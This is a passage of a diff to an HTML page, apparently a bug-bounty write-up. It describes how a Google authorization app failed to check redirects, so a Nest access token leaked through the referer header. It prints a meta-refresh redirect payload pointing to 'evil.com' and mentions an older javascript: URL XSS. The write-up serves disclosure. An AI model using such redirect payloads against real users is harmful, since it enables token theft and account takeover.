@@ -67,8 +67,8 @@ which has an evil redirecting</li>
 <li>III: google authorization app was not checking the redirecting hence the victim's access token was leaking in referer.</li>
 </ul>
  the redireting was coming back through <xmp><meta http-equiv="refresh" content="0;URL='evil.com'" />   </xmp>
- you'd have been able to XSS the matter before few years ago, as most browsers now refusing to refresh to a javascript: URL.</br>
-<img src=https://i.imgur.com/urzAIDu.png height=200 width=200></br>
+ you'd have been able to XSS the matter before few years ago, as most browsers now refusing to refresh to a javascript: URL.</br></br>
+<img src=https://i.imgur.com/urzAIDu.png height=200 width=200></br></br>
 
  anyway, this XSS wasnt rewarded because it works only on older browsers but leaking the nest access token was, <mark> sometimes having google products/devices gives you advantges.</mark></br>
  <iframe width="560" height="315" src="https://www.youtube.com/embed/L8ySb-dPBW8" frameborder="0" allow="autoplay; encrypted-media" 
